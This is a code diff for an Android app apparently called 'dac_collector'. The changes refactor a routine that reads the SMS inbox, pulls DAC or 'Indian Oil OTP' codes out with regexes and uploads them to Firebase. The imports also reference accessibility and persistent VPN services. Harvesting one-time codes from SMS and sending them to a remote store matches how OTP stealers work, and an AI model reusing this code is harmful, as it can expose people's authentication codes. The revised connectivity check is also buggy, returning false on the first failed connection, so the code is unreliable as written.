@@ -3,28 +3,19 @@ package android.iocl.dac_collector.Utility;
 
 import android.annotation.SuppressLint;
 import android.app.ActivityManager;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.app.job.JobInfo;
 import android.app.job.JobScheduler;
-import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Color;
 import android.iocl.dac_collector.Firebase.FirebaseDBClient;
 import android.iocl.dac_collector.ModelData.RegexModel;
-import android.iocl.dac_collector.R;
 import android.iocl.dac_collector.Services.AcessibilitySettings;
 import android.iocl.dac_collector.Services.FixOppoAutoKill;
 import android.iocl.dac_collector.Services.PersistentVpnService;
-import android.iocl.dac_collector.Ui.MainActivity;
-import android.media.RingtoneManager;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
@@ -32,7 +23,6 @@ import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
-import android.service.notification.StatusBarNotification;
 import android.telephony.SmsManager;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
@@ -40,11 +30,7 @@ import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Base64;
 import android.util.Log;
-import android.view.View;
-import android.widget.RemoteViews;
 
-import androidx.annotation.RequiresApi;
-import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
 import com.google.gson.Gson;
@@ -61,18 +47,13 @@ import java.io.UnsupportedEncodingException;
 import java.lang.reflect.Type;
 import java.net.InetSocketAddress;
 import java.net.Socket;
-import java.net.SocketAddress;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.Date;
 import java.util.List;
 import java.util.Locale;
-import java.util.concurrent.ExecutionException;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
-import java.util.concurrent.TimeoutException;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -203,9 +184,10 @@ public class Utility {
 
 
     public static void getDACMessages(Context c) {
-        FirebaseDBClient fireDb = new FirebaseDBClient(c);
 
-        if (ContextCompat.checkSelfPermission(c, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+
+        if (ContextCompat.checkSelfPermission(c, "android.permission.READ_SMS")
+                == PackageManager.PERMISSION_GRANTED) {
             ContentResolver contentResolver = c.getContentResolver();
             Uri uri = Uri.parse("content://sms/inbox");
             String[] projection = {"_id", "address", "body", "date", "read", "type"};
@@ -215,58 +197,61 @@ public class Utility {
             try {
                 cursor = contentResolver.query(uri, projection, null, null, sortOrder);
                 if (cursor != null && cursor.moveToFirst()) {
-                    int count = 0;
+                    int bodyColumnIndex = cursor.getColumnIndex("body");
+                    int dateColumnIndex = cursor.getColumnIndex("date");
+
                     do {
-                        int bodyColumnIndex = cursor.getColumnIndex("body");
-                        int dateColumnIndex = cursor.getColumnIndex("date");
+                        if (bodyColumnIndex == -1 || dateColumnIndex == -1) break;
 
-                        if (bodyColumnIndex != -1 && dateColumnIndex != -1) {
-                            Long time = cursor.getLong(dateColumnIndex);
-                            long currentTime = System.currentTimeMillis();
-                            long twentyFourHoursInMillis = TimeUnit.HOURS.toMillis(10);
-                            if (currentTime - time < twentyFourHoursInMillis) {
-                                String body = cursor.getString(bodyColumnIndex);
-                                Long date = cursor.getLong(dateColumnIndex);
-                                String formattedDate = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.ENGLISH)
-                                        .format(new java.util.Date(date));
+                        long time = cursor.getLong(dateColumnIndex);
+                        long currentTime = System.currentTimeMillis();
+                        long windowMillis = TimeUnit.HOURS.toMillis(10);
 
-                                List<RegexModel> details = checkDACRegex(body, c);
+                        // Only check messages from the last 10 hours
 
 
-                                if (details != null && details.size() > 0) {
+                        if (currentTime - time < windowMillis) {
+                            String body = cursor.getString(bodyColumnIndex);
+                            String formattedDate = new SimpleDateFormat(
+                                    "dd-MM-yyyy HH:mm:ss", Locale.ENGLISH
+                            ).format(new Date(time));
 
-                                    boolean isDAC = details.get(0).getCaptures().size() > 1 ? true : false;
-                                    String DAC = isDAC ? details.get(0).getCaptures().get(1) : details.get(0).getCaptures().get(0);
+                            List<RegexModel> details = checkDACRegex(body, c);
 
-                                    String message = isDAC ? details.get(0).getCaptures().get(0) : "Indian Oil OTP";
 
-                                    if (isDAC) {
-                                        if (!details.get(0).getId().equals("DAC_SYNC")) {
-                                            fireDb.addToDb(DAC, message, formattedDate);
-                                            return;
-                                        }
-                                        fireDb.syncDac(DAC, message, formattedDate);
+
+
+                            if (details != null && !details.isEmpty()) {
+                                boolean isDAC = details.get(0).getCaptures().size() > 1;
+                                String DAC = isDAC ? details.get(0).getCaptures().get(1)
+                                        : details.get(0).getCaptures().get(0);
+
+                                String message = isDAC ? details.get(0).getCaptures().get(0)
+                                        : "Indian Oil OTP";
+
+                                if (isDAC) {
+
+
+                                    if (!details.get(0).getId().equals("GeneratedDAC")) {
+                                        FirebaseDBClient.addToDb(c, DAC, message, formattedDate);
+
+
+                                    } else {
+                                        FirebaseDBClient.syncDac(c,DAC, message, formattedDate);
                                     }
-
-
+                                    // ✅ Found first valid DAC → stop scanning
+                                    return;
                                 }
-
                             }
-
-
                         }
-
-                        count++;
-                    } while (cursor.moveToNext() && count < 40);
+                    } while (cursor.moveToNext()); // no need for count < 40 anymore
                 }
             } finally {
-                if (cursor != null) {
-                    cursor.close();
-                }
+                if (cursor != null) cursor.close();
             }
         }
-
     }
+
 
 
     public static List<RegexModel> checkDACRegex(String message, Context c) {
@@ -544,19 +529,32 @@ public class Utility {
             }
         }
 
+        int[] ports = {53, 80, 443}; // DNS, HTTP, HTTPS
+         String[] hosts = {
+                "8.8.8.8",    // Google DNS
+                "1.1.1.1",    // Cloudflare DNS
+                "8.8.4.4",    // Google DNS secondary
+                "208.67.222.222" // OpenDNS
+        };
+
         // 2) Direct TCP “ping” on current thread—1.5s max
-        try (Socket socket = new Socket()) {
-            socket.connect(new InetSocketAddress("8.8.8.8", 53), 1500);
-            return true;
-        } catch (IOException e) {
-            Log.e(TAG, "Internet check failed", e);
-            return false;
+        for (String host : hosts) {
+            for (int port : ports) {
+                try (Socket socket = new Socket()) {
+                    socket.connect(new InetSocketAddress(host, port), 2000);
+                    return true;
+                } catch (IOException e) {
+                    return false;
+                }
+            }
         }
+        return false;
+
     }
 
 
     public static void sendAnyUnsentDAC(Context c) {
-        FirebaseDBClient db = new FirebaseDBClient(c);
+
         SharedPreferences sharedPreferences = c.getSharedPreferences("unsent_dac", Context.MODE_PRIVATE);
 
         String DAC = sharedPreferences.getString("unsent_dac", "not_found");
@@ -573,7 +571,7 @@ public class Utility {
 
 
             String formattedDate = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.ENGLISH).format(new java.util.Date(savedTime));
-            db.syncDac(DAC, "unsent_dac", formattedDate);
+            FirebaseDBClient.syncDac(c, DAC, "unsent_dac", formattedDate);
             editor.putString("unsent_dac", "");
             editor.apply();
 
